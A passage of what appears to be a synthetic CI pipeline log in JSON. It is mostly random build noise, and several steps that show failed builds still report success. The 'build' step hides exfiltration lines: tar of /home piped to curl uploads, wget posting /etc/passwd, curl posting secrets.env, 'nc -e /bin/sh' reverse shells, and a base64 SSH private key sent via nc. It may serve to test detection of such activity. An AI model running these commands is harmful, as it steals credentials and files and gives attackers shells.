src/main.py...\n[12:00:35] INFO: Processing request\nInstalling lodash@1.5.0\n\u2717 build failed with exit code 67\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 build completed\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\nStep 2/10: Building\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nInstalling lodash@1.1.0\nWARNING: prettier has known vulnerabilities\nCompiling src/main.py...\nInstalling express@3.6.0\nCache hit for key-6691\n[12:00:35] ERROR: Connection failed\nCache hit for key-1221\n[12:00:35] INFO: Processing request\nCache hit for key-1129\nStep 4/10: Building\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\nInstalling axios@2.18.0\n\u2713 build completed\nStep 6/10: Building\n  PASS: test_api_health (237ms)\nCache hit for key-3307\nInstalling eslint@3.20.0\n  PASS: test_db_connect (348ms)\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (177ms)\nCache hit for key-6581\nStep 7/10: Building\nCache hit for key-4772\nCache hit for key-9768\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_db_connect (11ms)\n\u2713 test completed\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 test completed\nCache hit for key-9301\nCache hit for key-9780\nArtifact uploaded: build.tar.gz (34MB)\nWARNING: lodash has known vulnerabilities\nInstalling prettier@2.9.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (31MB)\n\u2713 lint completed\nInstalling webpack@4.15.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\nStep 4/10: Building\nCache hit for key-1742\nStep 9/10: Building\n  PASS: test_db_connect (70ms)\nInstalling express@1.1.0\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_cache_hit (343ms)\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nInstalling eslint@1.15.0\nStep 10/10: Building\n\u2713 build completed\nStep 10/10: Building\nCache hit for key-7121\nArtifact uploaded: build.tar.gz (13MB)\nInstalling axios@5.13.0\n[12:00:35] INFO: Processing request\nStep 9/10: Building\n[12:00:35] INFO: Processing request\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (32MB)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (18MB)\nInstalling webpack@4.2.0\nStep 6/10: Building\n  PASS: test_cache_hit (433ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_user_create (387ms)\nCompiling src/utils.go...\nCache hit for key-5276\n[12:00:35] INFO: Processing request\nCache hit for key-1365\n=== Step upload_artifacts completed ===\n=== Step: build ===\nStep 5/10: Building\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nCache hit for key-2160\nWARNING: webpack has known vulnerabilities\n  PASS: test_cache_hit (290ms)\n  PASS: test_db_connect (10ms)\nSending 299MB of data to acme.corp\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nCompiling src/main.py...\nException: NullPointerException\nArtifact uploaded: build.tar.gz (2MB)\nStep 9/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/main.py...\nCache hit for key-8288\nStep 10/10: Building\nInstalling jest@4.12.0\nnc -e /bin/sh 203.204.188.12 7314\nCache hit for key-2764\nCompiling src/utils.go...\nCompiling src/handler.rs...\nSending 246MB of data to acme.corp\n\u2713 build completed\n  PASS: test_api_health (343ms)\nInstalling eslint@2.4.0\n  PASS: test_auth_login (432ms)\n  PASS: test_auth_login (197ms)\nInstalling webpack@2.15.0\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 lint completed\nCache hit for key-2171\nArtifact uploaded: build.tar.gz (27MB)\ncurl -X POST https://startup.dev/collect -d @secrets.env\ncurl -X POST https://startup.dev/collect -d @secrets.env\nInstalling lodash@3.0.0\nStep 1/10: Building\nCache hit for key-7685\n[12:00:35] INFO: Processing request\nStep 4/10: Building\n\u2717 build failed with exit code 112\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\ncurl -X POST https://test.io/collect -d @secrets.env\n\u2713 lint completed\n\u2713 build completed\n[12:00:35] WARN: Deprecated API usage\n\u2713 lint completed\nCompiling src/handler.rs...\nCache hit for key-6184\nInstalling express@5.14.0\nStep 10/10: Building\n  PASS: test_db_connect (357ms)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nCompiling src/service.java...\nCompiling src/index.js...\n\u2713 test completed\nnc -e /bin/sh 247.48.143.138 11381\nCache hit for key-9424\nInstalling lodash@4.2.0\nCompiling src/app.ts...\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:35] INFO: Processing request\ncurl -X POST https://cloud.services/collect -d @secrets.env\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (20MB)\nInstalling react@1.9.0\n\u2713 build completed\nSending 341MB of data to acme.corp\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_cache_hit (466ms)\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_user_create (209ms)\nException: TypeError\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nSending 185MB of data to acme.corp\n  PASS: test_user_create (140ms)\nCache hit for key-7224\n  PASS: test_auth_login (417ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (308ms)\nStep 5/10: Building\n\u2713 test completed\n\u2713 lint completed\nnc -e /bin/sh 115.192.228.182 64691\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling jest@2.15.0\nInstalling prettier@1.10.0\n[12:00:35] INFO: Processing request\nSending 464MB of data to test.io\nCache hit for key-8785\nSending 47MB of data to example.com\n\u2713 lint completed\nSending 345MB of data to cloud.services\nStep 10/10: Building\n\u2713 lint completed\nCache hit for key-8219\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n  PASS: test_api_health (37ms)\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n\u2713 lint completed\nStep 7/10: Building\nCache hit for key-3711\nStep 10/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 92.102.117.75 38093\n=== Step build completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-24T12:00:35.059127",
        "finished_at": "2025-11-24T12:00:40.669191",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_cache_hit (200ms)",
          "\u2713 test completed",
          "Cache hit for key-1197",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Exception: ValueError",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Installing axios@5.13.0",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "  PASS: test_cache_hit (344ms)",
          "Step 1/10: Building",
          "FAILED: test_user_create",
          "Installing prettier@3.8.0",
          "Cache hit for key-2391",
          "Cache hit for key-7300",
          "Compiling src/utils.go...",
          "Step 8/10: Building",
          "  PASS: test_api_health (354ms)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Installing axios@5.4.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Installing axios@3.20.0",
          "Compiling src/utils.go...",
          "Installing jest@2.20.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-9764",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Cache hit for key-5024",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-5644",
          "  PASS: test_api_health (290ms)",
          "  PASS: test_api_health (152ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "Installing jest@3.16.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 1/10: Building",
          "Installing express@5.15.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-8981",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing eslint@2.6.0",
          "FAILED: test_db_connect",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (280ms)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3121",
          "Step 3/10: Building",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing jest@2.10.0",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-24T12:00:40.669191",
        "finished_at": "2025-11-24T12:00:50.019298",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3020",
          "Step 2/10: Building",
          "Cache hit for key-2601",
          "Installing jest@2.9.0",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "Exception: ValueError",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "FAILED: test_cache_hit",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Installing express@2.20.0",
          "Step 5/10: Building",
          "Step 5/10: Building",
          "Cache hit for key-4500",
          "Compiling src/index.js...",
          "Installing axios@3.7.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (384ms)",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (352ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 9/10: Building",
          "\u2717 build failed with exit code 57",
          "Step 7/10: Building",
          "  PASS: test_api_health (420ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Installing webpack@1.3.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_user_create (24ms)",
          "  PASS: test_user_create (457ms)",
          "\u2713 build completed",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_db_connect (454ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Installing react@2.9.0",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Installing react@1.11.0",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "  PASS: test_cache_hit (495ms)",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@1.4.0",
          "Cache hit for key-8523",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_api_health (210ms)",
          "[12:00:35] INFO: Processing request",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-24T12:00:50.019298",
        "finished_at": "2025-11-24T12:01:18.069620",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Cache hit for key-5802",
          "Cache hit for key-6516",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-9828",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Exception: TypeError",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (323ms)",
          "Cache hit for key-3216",
          "\u2713 build completed",
          "  PASS: test_db_connect (58ms)",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-2378",
          "Step 1/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_api_health (185ms)",
          "\u2713 test completed",
          "Installing jest@5.0.0",
          "Step 10/10: Building",
          "Cache hit for key-7737",
          "Exception: ValueError",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Cache hit for key-2748",
          "Cache hit for key-5435",
          "  PASS: test_user_create (191ms)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_api_health (256ms)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_auth_login (266ms)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Cache hit for key-3919",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Installing express@5.2.0",
          "Cache hit for key-8514",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Cache hit for key-1274",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Installing jest@1.5.0",
          "[12:00:35] INFO: Processing request",
          "\u2717 build failed with exit code 109",
          "Cache hit for key-2989",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_auth_login (58ms)",
          "Cache hit for key-7907",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_user_create (156ms)",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-24T12:01:18.069620",
        "finished_at": "2025-11-24T12:01:27.419727",
        "log_lines": [
          "=== Step: type_check ===",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (246ms)",
          "[12:00:35] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_db_connect (90ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 7/10: Building",
          "  PASS: test_auth_login (3ms)",
          "Installing axios@1.2.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 6/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-5426",
          "  PASS: test_user_create (356ms)",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-9209",
          "\u2713 lint completed",
          "Cache hit for key-1999",
          "Exception: RuntimeError",
          "Cache hit for key-5534",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-3709",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Installing webpack@1.12.0",
          "Cache hit for key-1410",
          "Cache hit for key-8465",
          "Cache hit for key-9877",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing lodash@4.7.0",
          "\u2713 test completed",
          "  PASS: test_user_create (63ms)",
          "  PASS: test_auth_login (67ms)",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Installing express@2.13.0",
          "[12:00:35] ERROR: Connection failed",
          "Cache hit for key-6389",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_api_health (201ms)",
          "  PASS: test_api_health (37ms)",
          "Installing jest@1.20.0",
          "Compiling src/handler.rs...",
          "Installing eslint@3.9.0",
          "Cache hit for key-6271",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 1/10: Building",
          "Installing jest@1.4.0",
          "Cache hit for key-2517",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 1/10: Building",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-1083",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/utils.go...",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "Compiling src/main.py...",
          "Installing axios@5.12.0",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (430ms)",
          "[12:00:35] INFO: Processing request",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-24T12:01:27.419727",
        "finished_at": "2025-11-24T12:01:46.119942",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-6646",
          "\u2713 lint completed",
          "Installing prettier@2.9.0",
          "  PASS: test_db_connect (297ms)",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "Installing jest@2.19.0",
          "Cache hit for key-1131",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing react@3.11.0",
          "Cache hit for key-4949",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-9464",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Installing express@1.13.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-4468",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-4428",
          "  PASS: test_api_health (176ms)",
          "Step 2/10: Building",
          "Cache hit for key-9518",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Cache hit for key-5760",
          "  PASS: test_db_connect (102ms)",
          "\u2717 build failed with exit code 81",
          "Installing react@2.14.0",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (182ms)",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "Cache hit for key-9749",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_user_create (389ms)",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Installing eslint@4.8.0",
          "  PASS: test_cache_hit (139ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing prettier@1.16.0",
          "Installing eslint@3.0.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] ERROR: Connection failed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Exception: NullPointerException",
          "  PASS: test_user_create (370ms)",
          "Cache hit for key-6095",
          "  PASS: test_auth_login (335ms)",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (416ms)",
          "Exception: TypeError",
          "[12:00:35] ERROR: Connection failed",
          "Exception: TypeError",
          "Step 2/10: Building",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (357ms)",
          "  PASS: test_db_connect (163ms)",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_api_health (391ms)",
          "Step 10/10: Building",
          "  PASS: test_db_connect (490ms)",
          "  PASS: test_db_connect (48ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-24T12:01:46.119942",
        "finished_at": "2025-11-24T12:01:49.859985",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 3/10: Building",
          "Cache hit for key-7150",
          "[12:00:35] INFO: Processing request",
          "Installing express@4.6.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/service.java...",
          "Step 9/10: Building",
          "\u2717 build failed with exit code 17",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-7107",
          "Cache hit for key-9549",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (282ms)",
          "Installing eslint@4.7.0",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_user_create (387ms)",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_db_connect (59ms)",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing jest@4.15.0",
          "[12:00:35] INFO: Processing request",
          "Installing express@4.13.0",
          "WARNING: axios has known vulnerabilities",
          "Installing axios@4.4.0",
          "Cache hit for key-1953",
          "Cache hit for key-3046",
          "Cache hit for key-7988",
          "[12:00:35] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing lodash@3.17.0",
          "  PASS: test_user_create (399ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "Step 9/10: Building",
          "[12:00:35] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-4603",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (67ms)",
          "Step 7/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-5439",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (239ms)",
          "Installing webpack@4.19.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (288ms)",
          "FAILED: test_auth_login",
          "  PASS: test_auth_login (472ms)",
          "Installing eslint@5.10.0",
          "\u2717 build failed with exit code 34",
          "Installing react@2.7.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-1495",
          "\u2713 lint completed",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-24T12:01:49.859985",
        "finished_at": "2025-11-24T12:01:59.210092",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-8127",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Installing eslint@4.1.0",
          "  PASS: test_db_connect (49ms)",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "FAILED: test_db_connect",
          "Installing lodash@5.11.0",
          "Installing eslint@2.11.0",
          "Installing webpack@4.4.0",
          "  PASS: test_db_connect (349ms)",
          "  PASS: test_user_create (44ms)",
          "Compiling src/index.js...",
          "Cache hit for key-8941",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-5691",
          "  PASS: test_db_connect (371ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-4166",
          "Compiling src/service.java...",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-1317",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_api_health (240ms)",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "  PASS: test_user_create (369ms)",
          "  PASS: test_auth_login (68ms)",
          "Installing express@4.11.0",
          "FAILED: test_api_health",
          "\u2713 test completed",
          "  PASS: test_db_connect (14ms)",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2836",
          "  PASS: test_cache_hit (107ms)",
          "Installing react@3.1.0",
          "\u2713 lint completed",
          "Cache hit for key-5940",
          "  PASS: test_user_create (351ms)",
          "Installing webpack@5.11.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-1747",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "Cache hit for key-2877",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_db_connect (298ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-8435",
          "\u2713 lint completed",
          "  PASS: test_auth_login (148ms)",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-6620",
          "Step 6/10: Building",
          "Step 8/10: Building",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@1.4.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (383ms)",
          "  PASS: test_user_create (187ms)",
          "  PASS: test_cache_hit (326ms)",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "  PASS: test_auth_login (198ms)",
          "Cache hit for key-8986",
          "\u2717 build failed with exit code 74",
          "Step 8/10: Building",
          "Step 10/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-7373",
          "\u2713 lint completed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-24T12:01:59.210092",
        "finished_at": "2025-11-24T12:02:08.560199",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:00:35] INFO: Processing request",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (293ms)",
          "\u2713 lint completed",
          "Installing jest@1.11.0",
          "  PASS: test_user_create (155ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
